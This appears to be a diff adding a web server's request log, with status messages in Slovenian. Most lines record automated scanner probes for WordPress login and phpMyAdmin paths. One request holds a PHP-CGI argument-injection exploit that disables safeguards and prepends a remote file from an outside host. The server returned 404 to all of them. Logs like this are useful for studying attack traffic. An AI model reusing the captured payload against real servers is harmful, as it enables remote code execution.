@@ -1,0 +1,16 @@
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+Incoming Request from: 91.106.68.133 for href: /
+Incoming Request from: 198.204.225.115 for href: /wp-login.php
+pošiljam 404 Error: ENOENT, open '/root/wp-login.php'
+Incoming Request from: 196.203.214.161 for href: /phpMyAdmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/phpMyAdmin'
+Incoming Request from: 196.203.214.161 for href: /pma/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/pma'
+Incoming Request from: 113.240.250.156 for href: /
+Incoming Request from: 113.240.250.156 for href: /
+Incoming Request from: 113.240.250.156 for href: /nice%20ports%2C/Tri%6Eity.txt%2ebak
+pošiljam 404 Error: ENOENT, open '/root/nice%20ports%2C'
+Incoming Request from: 113.240.250.156 for href: /
+Incoming Request from: 118.193.90.130 for href: /
+Incoming Request from: 191.96.249.97 for href: /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+pošiljam 404 Error: ENOENT, open '/root/cgi-bin'
